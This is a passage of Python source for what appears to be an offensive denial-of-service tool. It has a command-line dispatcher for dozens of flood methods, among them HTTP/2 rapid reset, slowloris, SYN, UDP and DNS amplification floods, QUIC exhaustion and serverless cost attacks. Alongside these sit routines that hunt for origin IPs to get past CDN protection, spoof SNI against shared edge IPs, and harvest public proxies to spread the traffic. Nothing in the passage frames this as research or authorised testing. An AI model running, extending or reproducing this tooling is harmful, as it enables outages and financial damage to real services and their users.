        if not func:
            print(f" {c('r','[-]')} Unknown DoW attack: {method}")
            await dashboard.stop()
            return
        result = await func(url=target, duration=duration, rps=rps, proxy_pool=opts["proxy_pool"], live_stats=vec)
        vec["status"] = "done"
    except KeyboardInterrupt:
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        vec["status"] = "error"
    
    await dashboard.stop()
                            
    print_attack_summary(target, duration, result)


async def run_underminr_bypass(target: str):
    """Underminr CDN Bypass - SNI spoofing against shared edge IPs (2026 technique)"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    print(f"\n {c('c','[*]')} Underminr CDN Bypass | {target}")
    print(f" {c('c','[*]')} Technique: SNI spoofing against shared edge IPs")
    print(f" {c('c','[*]')} Exploits architectural CDN flaw (2026)")
    _rich_sep()

    result = await run_go_engine(
        target=target, duration=30, rps=1,
        method="underminr", threads=5,
    )

    # Parse result for bypass success
    total = result.get("total_requests", 0)
    completed = result.get("completed", 0)
    if completed > 0:
        print(f" {c('g','[+]')} Underminr bypass found working SNI-edge IP combinations!")
    else:
        print(f" {c('y','[!]')} Underminr bypass did not find any working combination")


async def run_origin_hunt(target: str, env: dict):
    """Standalone origin IP hunting with auto-save"""
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    # Check for cached result first
    try:
        from core.recon.origin.origin_store import load_hunt
        cached = load_hunt(target)
        if cached:
            age_hours = (time.time() - cached.get("timestamp", 0)) / 3600
            if age_hours < 24:
                print(f" {c('y','[*]')} Found cached hunt ({age_hours:.1f}h old)")
                use_cache = get_input("   Use cached result instead of re-hunting? (Y/n): ").lower() != "n"
                if use_cache:
                    _rich_header("CACHED ORIGIN HUNT RESULTS")
                    print(f"  Target:           {cached['target']}")
                    print(f"  Hunted at:        {cached['timestamp_human']}")
                    print(f"  Verified origins: {c('g', str(len(cached['verified_origins'])))}")
                    print(f"  Total candidates: {len(cached['candidates'])}")
                    _rich_sep()
                    if cached['verified_origins']:
                        print(f"  {c('g','VERIFIED ORIGINS:')}")
                        for ip in cached['verified_origins']:
                            print(f"    {c('g', ip)}")
                    if cached['candidates']:
                        print(f"\n  {c('y','TOP CANDIDATES:')}")
                        for cand in cached['candidates'][:10]:
                            ip = cand.get('ip', '')
                            conf = cand.get('confidence', 0)
                            src = cand.get('source', '')
                            tag = c('g','VERIFIED') if cand.get('verified') else c('d','candidate')
                            print(f"    {ip:20s}  conf={conf:.0%}  src={src}  [{tag}]")
                    _rich_sep()
                    return
    except Exception:
        pass

    print(f"\n {c('c','[*]')} Hunting origin IP for: {target}")
    print(f" {c('c','[*]')} This will scan 29 sources in parallel (15-45s)...")
    _rich_sep()

    try:
        from core.recon.origin.origin_hunter import OriginHunter, print_hunt_report
        hunter = OriginHunter(timeout=10, max_concurrent=200)
        report = await hunter.hunt(target, env=env)
        print_hunt_report(report, color_func=c)

        # auto-saved by hunter, just inform user
        if report.candidates:
            from core.recon.origin.origin_store import _hostname_from_url, STORE_DIR
            host = _hostname_from_url(target)
            print(f" {c('g','[+]')} Auto-saved to: {STORE_DIR}/{host}.json")
            print(f" {c('g','[+]')} Plain text:    {STORE_DIR}/{host}.txt")
            print(f" {c('c','[*]')} Other attacks will auto-load this origin next time you target {host}")
    except Exception as e:
        print(f" {c('r','[-]')} Origin hunt failed: {e}")
        import traceback
        traceback.print_exc()

async def run_proxy_harvest(target_url: str = None):
    """Auto-harvest and validate fresh proxies"""
    print(f"\n {c('c','[*]')} Auto-Harvesting Proxies")
    print(f" {c('c','[*]')} Scraping from 25+ public sources in parallel")
    if target_url:
        print(f" {c('c','[*]')} Validating against: {target_url}")
    _rich_sep()

    try:
        from core.network.proxy_harvester import auto_harvest_and_validate

        last_print = [0]
        def progress(stage, current, alive):
            import time
            now = time.time()
            if now - last_print[0] < 0.5:
                return
            last_print[0] = now
            if stage == "scrape":
                print(f"\r {c('c','[*]')} Scraping proxy sources...                              ", end="", flush=True)
            elif stage == "validate":
                print(f"\r {c('c','[*]')} Validating: {current} checked, {c('g',str(alive))} alive   ", end="", flush=True)

        result = await auto_harvest_and_validate(
            target_url=target_url,
            save_path="proxies/alive.txt",
            min_rtt_ms=3000,
            progress_cb=progress,
        )

        print()
        _rich_header("PROXY HARVEST REPORT")
        print(f"  Scraped:        {c('w', str(result['scraped']))} proxies")
        print(f"  Alive:          {c('g', str(result['alive']))}")
        print(f"  Fast (<3s):     {c('g', str(result['fast_alive']))}")
        print(f"  Time elapsed:   {result['elapsed']}s")
        print(f"  By type:        HTTP={result['by_type']['http']} SOCKS5={result['by_type']['socks5']} SOCKS4={result['by_type']['socks4']}")
        print(f"  Saved to:       {c('g', result['save_path'])}")
        if result['proxies']:
            print(f"\n {c('y','TOP 10 FASTEST:')}")
            for p in result['proxies'][:10]:
                print(f"    {p['url']:50s}  rtt={p['rtt_ms']:.0f}ms  type={p['type']}")
        _rich_sep()
    except Exception as e:
        print(f" {c('r','[-]')} Harvest failed: {e}")
        import traceback
        traceback.print_exc()

async def run_legacy_mode(target: str, cfg: dict):
    """
    Legacy compatibility function.
    This mode has been merged into Auto Mode v2 (Module 9).
    """
    print(f"\n {c('y','[*]')} This mode has been merged into Auto Mode v2 (Module 9).")
    print(f" {c('y','[*]')} All vectors now run together in optimized configuration.")
    print(f" {c('c','[*]')} Forwarding to Auto Mode...\n")
    await run_auto_mode(target, cfg)

async def main():
    p = argparse.ArgumentParser(description=f"Multi-Protocol Concurrency Layer v{VERSION} [2026]")
    p.add_argument("--start", action="store_true", help="Interactive menu mode")
    p.add_argument("--target", "-t", default="")
    p.add_argument("--method", "-m", default="",
        choices=["http-flood", "http2-flood", "rapid-reset", "continuation",
                 "slowloris", "syn-flood", "udp-flood", "proxy-flood",
                 "post-bomb", "conn-flood", "amplification",
                 "ws-storm", "settings-flood", "tls-reneg",
                 "quic-stream-hijack", "quic-cid-flood", "quic-crypto-exhaust",
                 "smuggling", "hpack-bomb", "cache-bypass",
                 "mixed", "auto",
                 "headers-flood", "cookie-bomb", "range-amp", "xmlrpc",
                 "api-flood", "api-rest", "graphql", "graphql-deep",
                 "grpc-flood", "json-bomb", "xml-bomb",
                 "cold-start", "cost-accum", "websocket",
                 "dns-flood", "dns-amp"])
    p.add_argument("--duration", "-d", type=int, default=0)
    p.add_argument("--rps", "-r", type=int, default=0)
    p.add_argument("--threads", "-T", type=int, default=0)
    p.add_argument("--proxy-file", "-p", default="")
    p.add_argument("--http2", action="store_true", help="Force HTTP/2")
    p.add_argument("--rapid-reset", action="store_true", help="Enable HTTP/2 Rapid Reset")
    p.add_argument("--go-engine", action="store_true", default=True, help="Use Go engine")
    p.add_argument("--validate", action="store_true", help="Validate target downtime via external check")
    p.add_argument("--origin-ip", default="")
    p.add_argument("--config", "-c", default="config/default.yaml")
    args = p.parse_args()

    cfg = load_config(args.config)

    if args.start:
        await cmd_menu(cfg)
        return

    if args.target:
        await cmd_start(args, cfg)
    else:
        banner()
        print(f"  {c('r','Error:')} No target specified.")
        print(f"  Use --start for interactive menu, or -t TARGET for direct mode.\n")

async def cmd_start(args, cfg):
    target = args.target
    if not target.startswith(("http://", "https://")):
        target = "https://" + target

    banner()
    print(f"  {c('c','[*]')} Target: {c('w', target)}")
    print(f"  {c('c','[*]')} Method: {args.method or 'auto'}")
    _rich_sep()

    duration = args.duration or cfg["attack"]["default_duration"]
    rps = args.rps or cfg["attack"]["initial_rps"]
    method = args.method or "auto"

    # CLI direct mode - no interactive prompts
    if method == "auto":
        # Smart auto mode
        profile = await auto_detect_target(target, verbose=True)
        if profile is None:
            print(f" {c('r','[-]')} Auto-detect failed")
            return

        if profile.supports_http2:
            print(f" {c('g','[+]')} Using RAPID-RESET (HTTP/2 detected)")
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="http-flood", rapid_reset=True
            )
        else:
            print(f" {c('g','[+]')} Using HTTP-FLOOD (HTTP/1.1)")
            result = await run_go_engine(
                target=target, duration=duration, rps=rps,
                method="http-flood"
            )
    elif method in ("http-flood", "http2-flood", "rapid-reset"):
        # Smart layer7 with auto-detect
        result = await smart_layer7_attack(
            target=target, duration=duration, rps=rps,
            user_method=method, proxy_file=args.proxy_file, cfg=cfg
        )
    elif method == "slowloris":
        from core.attack.engines.enhanced import run_enhanced_attack
        result = await run_enhanced_attack(
            url=target, duration=duration, method="slowloris", rps=rps
        )
    elif method == "syn-flood":
        # Auto-detect CDN and find origin
        print(f" {c('c','[*]')} Checking for CDN protection...")
        profile = await auto_detect_target(target, verbose=False)
        origin_ip = None
        if profile and profile.has_cdn:
            print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
            print(f" {c('c','[*]')} Searching for origin IP...")
            try:
                from core.recon.origin.origin_finder import find_origin_ip
                origin_result = await find_origin_ip(target, timeout=15)
                if origin_result and origin_result.get("origin_ip"):
                    origin_ip = origin_result["origin_ip"]
                    print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
                    target = origin_ip
                else:
                    print(f" {c('r','[-]')} Origin IP not found - attack may fail against CDN")
            except Exception as e:
                print(f" {c('r','[-]')} Origin search failed: {e}")
        else:
            print(f" {c('g','[+]')} No CDN detected")
        
        if IS_WINDOWS:
            from core.attack.engines.layer4_v5 import TcpConnectionFlood
            engine = TcpConnectionFlood()
            r = await engine.attack(target, duration=duration, threads=100)
            result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": r.get("failed",0), "timeout": 0, "elapsed": duration}
        else:
            result = await run_go_engine(target=target, duration=duration, rps=rps, method="syn-flood")
    elif method == "udp-flood":
        # Auto-detect CDN and find origin
        print(f" {c('c','[*]')} Checking for CDN protection...")
        profile = await auto_detect_target(target, verbose=False)
        origin_ip = None
        if profile and profile.has_cdn:
            print(f" {c('y','[!]')} CDN detected: {profile.cdn_provider or 'Unknown'}")
            print(f" {c('c','[*]')} Searching for origin IP...")
            try:
                from core.recon.origin.origin_finder import find_origin_ip
                origin_result = await find_origin_ip(target, timeout=15)
                if origin_result and origin_result.get("origin_ip"):
                    origin_ip = origin_result["origin_ip"]
                    print(f" {c('g','[+]')} Origin IP found: {origin_ip}")
                    target = origin_ip
                else:
                    print(f" {c('r','[-]')} Origin IP not found - attack may fail against CDN")
            except Exception as e:
                print(f" {c('r','[-]')} Origin search failed: {e}")
        else:
            print(f" {c('g','[+]')} No CDN detected")
        
        if IS_WINDOWS:
            from core.attack.engines.layer4_v5 import UdpFloodV5
            engine = UdpFloodV5()
            r = await engine.attack(target, duration=duration, threads=100)
            result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": 0, "timeout": 0, "elapsed": duration}
        else:
            result = await run_go_engine(target=target, duration=duration, rps=rps, method="udp-flood")
    elif method in ("dns-flood", "dns-amp"):
        from core.attack.engines.layer4_v5 import DnsAmplificationFlood
        engine = DnsAmplificationFlood()
        r = await engine.attack(target, duration=duration, threads=100)
        result = {"total_requests": r.get("sent",0), "completed": r.get("sent",0), "failed": 0, "timeout": 0, "elapsed": duration}
    elif method == "proxy-flood":
        from core.network.proxy import ProxyPool
        from core.attack.engines.enhanced import run_enhanced_attack
        proxy_file = args.proxy_file or "proxies/http.txt"
        proxy_pool = ProxyPool(connect_timeout=5, min_pool=cfg["proxy"]["min_pool"])
        total = await proxy_pool.load_file(proxy_file)
        if total == 0:
            print(f" {c('r','[-]')} No proxies in {proxy_file}")
            return
        proxy_pool._validator.set_target(target)
        alive = await proxy_pool.quick_validate(total, concurrency=40)
        print(f" {c('g','[+]')} {alive}/{total} proxies alive")
        result = await run_enhanced_attack(
            url=target, duration=duration, method="http_get_flood",
            rps=rps, proxy_pool=proxy_pool
        )
    elif method == "mixed":
        profile = await auto_detect_target(target, verbose=True)
        per = rps // 3
        tasks = []
        if profile and profile.supports_http2:
            tasks.append(run_go_engine(target, duration, int(rps * 0.6), "http-flood", rapid_reset=True))
            tasks.append(run_go_engine(target, duration, int(rps * 0.3), "http-flood", http2=True))
        else:
            tasks.append(run_go_engine(target, duration, int(rps * 0.5), "http-flood"))
            tasks.append(run_go_engine(target, duration, int(rps * 0.4), "http-flood"))
        from core.attack.engines.enhanced import run_enhanced_attack
        tasks.append(run_enhanced_attack(url=target, duration=duration, method="slowloris", rps=200))
        results = await asyncio.gather(*tasks, return_exceptions=True)
        result = {"total_requests": 0, "completed": 0, "failed": 0, "timeout": 0}
        for r in results:
            if isinstance(r, dict):
                for k in result:
                    result[k] += r.get(k, 0)
    elif method in ("quic-stream-hijack", "quic-cid-flood", "quic-crypto-exhaust"):
        result = await run_go_engine(
            target=target, duration=duration, rps=rps, method=method
        )
    elif method in ("api-flood", "api-rest"):
        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
        result = await API_ATTACK_METHODS["api_rest_flood"](url=target, duration=duration, rps=rps)
    elif method in ("graphql", "graphql-deep"):
        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
        result = await API_ATTACK_METHODS["graphql_deep"](url=target, duration=duration, rps=rps)
    elif method == "grpc-flood":
        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
        result = await API_ATTACK_METHODS["grpc_flood"](url=target, duration=duration, rps=rps)
    elif method in ("json-bomb", "xml-bomb"):
        from core.attack.specialized.api_attacks import API_ATTACK_METHODS
        result = await API_ATTACK_METHODS["json_bomb"](url=target, duration=duration, rps=rps)
    elif method in ("cold-start", "cost-accum"):
        from core.attack.specialized.serverless_dow import DOW_ATTACK_METHODS
        result = await DOW_ATTACK_METHODS["cold_start"](url=target, duration=duration, rps=rps)
    else:
        # Default to http-flood
        result = await run_go_engine(
            target=target, duration=duration, rps=rps, method="http-flood"
        )

    print_attack_summary(target, duration, result)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print(f"\n {c('y','[!]')} Cancelled.")
        sys.exit(0)
    except Exception as e:
        logger.error("Fatal: %s", str(e), exc_info=True)
        sys.exit(1)
